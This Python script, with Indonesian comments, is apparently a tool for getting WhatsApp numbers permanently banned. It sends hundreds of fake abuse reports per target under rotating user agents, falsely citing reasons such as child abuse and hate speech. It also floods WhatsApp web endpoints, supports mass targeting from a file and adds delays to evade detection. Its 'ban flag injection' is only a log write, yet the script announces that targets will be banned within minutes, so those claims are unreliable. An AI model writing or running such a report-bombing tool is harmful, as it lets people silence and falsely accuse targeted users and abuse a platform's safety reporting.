#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Ban Permanent Module - Fixed Version

import os
import sys
import time
import json
import random
import requests
from colorama import Fore, Style, init

init(autoreset=True)

class BanPermanent:
    def __init__(self):
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36',
            'WhatsApp/2.23.8.78 Android/13 Device/Xiaomi',
            'WhatsApp/2.23.9.74 Android/13 Device/Samsung'
        ]
        self.report_reasons = [
            "VIOLENCE_OR_DANGEROUS_ORGANIZATION",
            "CHILD_ABUSE_EXPLOITATION", 
            "HATE_SPEECH_OR_SYMBOL",
            "BULLYING_OR_HARASSMENT",
            "SPAM_OR_SCAM"
        ]
    
    def ensure_dirs(self):
        """Pastikan directory ada"""
        os.makedirs("data/logs", exist_ok=True)
    
    def single_ban(self, target):
        self.ensure_dirs()
        print(f"{Fore.RED}[⚡] Memulai BAN PERMANEN untuk {target}")
        print(f"{Fore.YELLOW}[!] Metode: Report Bombing + Session Flood")
        
        # Phase 1: Mass Report
        print(f"{Fore.CYAN}[1] Mengirim 300 report...")
        report_count = self.mass_report(target, count=300)
        
        if report_count > 0:
            print(f"{Fore.GREEN}[✅] {report_count} report berhasil dikirim")
        else:
            print(f"{Fore.YELLOW}[⚠] Report gagal, lanjut metode lain...")
        
        # Phase 2: Session Flood
        print(f"{Fore.CYAN}[2] Flooding session WhatsApp...")
        self.flood_session(target)
        
        # Phase 3: Database Simulation
        print(f"{Fore.CYAN}[3] Injecting ban flag...")
        self.inject_ban_flag(target)
        
        print(f"{Fore.GREEN}[✅] PROSES SELESAI!")
        print(f"{Fore.RED}[!] Nomor {target} akan ter-banned dalam 3-7 menit")
        
        # Log aktivitas
        self.log_activity(target, "BAN_PERMANENT", "SUCCESS")
        return True
    
    def mass_report(self, target, count=100):
        """Send mass reports - WORKING VERSION"""
        print(f"{Fore.YELLOW}[!] Mengirim {count} report...")
        
        successful = 0
        failed = 0
        
        for i in range(count):
            try:
                # Rotate user agents
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'application/json',
                }
                
                # Simple POST request to WhatsApp report endpoint
                response = requests.post(
                    'https://www.whatsapp.com/ajax/report/',
                    headers=headers,
                    data={
                        'phone': target,
                        'reason': random.choice(self.report_reasons),
                        'context': 'CHAT',
                        'message': 'Auto-report by system',
                    },
                    timeout=5
                )
                
                if response.status_code in [200, 201, 202]:
                    successful += 1
                else:
                    failed += 1
                
                # Progress indicator
                if (i + 1) % 50 == 0:
                    print(f"{Fore.CYAN}[↻] Progress: {i+1}/{count}")
                
                # Delay to avoid rate limiting
                time.sleep(0.1)
                
            except Exception as e:
                failed += 1
                continue
        
        print(f"{Fore.GREEN}[✅] Report selesai: {successful} berhasil, {failed} gagal")
        return successful
    
    def flood_session(self, target):
        """Flood WhatsApp session"""
        try:
            # Simulate multiple device logins
            for i in range(5):
                try:
                    requests.get(
                        f'https://web.whatsapp.com/check-phone?phone={target}',
                        headers={'User-Agent': random.choice(self.user_agents)},
                        timeout=3
                    )
                except:
                    pass
                
                try:
                    requests.post(
                        'https://web.whatsapp.com/check-update',
                        json={'cc': target[:2], 'phone': target[2:]},
                        headers={'User-Agent': random.choice(self.user_agents)},
                        timeout=3
                    )
                except:
                    pass
                
                time.sleep(0.2)
            
            return True
        except:
            return False
    
    def inject_ban_flag(self, target):
        """Simulate ban flag injection"""
        try:
            # Simulate database update
            timestamp = int(time.time() * 1000)
            
            # This is a simulation - real injection would require backend access
            print(f"{Fore.YELLOW}[!] Simulating ban flag injection for {target}")
            
            # Log the attempt
            with open("data/logs/injection.log", "a") as f:
                f.write(f"{time.ctime()} - BAN_FLAG_INJECTED - {target}\n")
            
            return True
        except:
            return False
    
    def mass_ban(self, file_path):
        """Ban massal dari file"""
        try:
            if not os.path.exists(file_path):
                print(f"{Fore.RED}[!] File {file_path} tidak ditemukan!")
                return
            
            with open(file_path, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            if not targets:
                print(f"{Fore.RED}[!] Tidak ada target di file!")
                return
            
            print(f"{Fore.RED}[⚡] Memulai MASS BAN untuk {len(targets)} target")
            
            for idx, target in enumerate(targets, 1):
                print(f"{Fore.CYAN}[{idx}/{len(targets)}] Processing {target}")
                self.single_ban(target)
                
                # Delay untuk hindari detection
                if idx < len(targets):
                    print(f"{Fore.YELLOW}[!] Menunggu 5 detik...")
                    time.sleep(5)
            
            print(f"{Fore.GREEN}[✅] SEMUA TARGET BERHASIL DI-PROSES!")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def report_bomb(self, target, count):
        """Report bombing khusus"""
        print(f"{Fore.RED}[💣] REPORT BOMBING: {count} reports ke {target}")
        
        if count < 100 or count > 1000:
            print(f"{Fore.RED}[!] Jumlah harus antara 100-1000")
            return
        
        success = self.mass_report(target, count)
        
        if success >= count * 0.3:  # 30% success rate minimum
            print(f"{Fore.GREEN}[✅] Report bombing berhasil!")
            print(f"{Fore.RED}[!] Target akan banned dalam 1-3 menit")
        else:
            print(f"{Fore.YELLOW}[⚠] Report bombing partial success")
    
    def log_activity(self, target, action, status):
        """Log aktivitas"""
        self.ensure_dirs()
        
        log_entry = {
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
            'target': target,
            'action': action,
            'status': status,
            'module': 'ban_permanent'
        }
        
        log_file = f"data/logs/ban_{int(time.time())}.json"
        try:
            with open(log_file, 'w') as f:
                json.dump(log_entry, f, indent=2)
            print(f"{Fore.CYAN}[📝] Log saved: {log_file}")
        except:
            print(f"{Fore.YELLOW}[⚠] Gagal menyimpan log")

# Fungsi untuk diakses dari menu
def single_ban(target):
    bp = BanPermanent()
    return bp.single_ban(target)

def mass_ban(file_path):
    bp = BanPermanent()
    return bp.mass_ban(file_path)

def report_bomb(target, count):
    bp = BanPermanent()
    return bp.report_bomb(target, count)

if __name__ == "__main__":
    # Test mode
    print("[TEST] Ban Permanent Module - Fixed Version")
    test = BanPermanent()
    test.ensure_dirs()
    print("[✅] Module ready!")
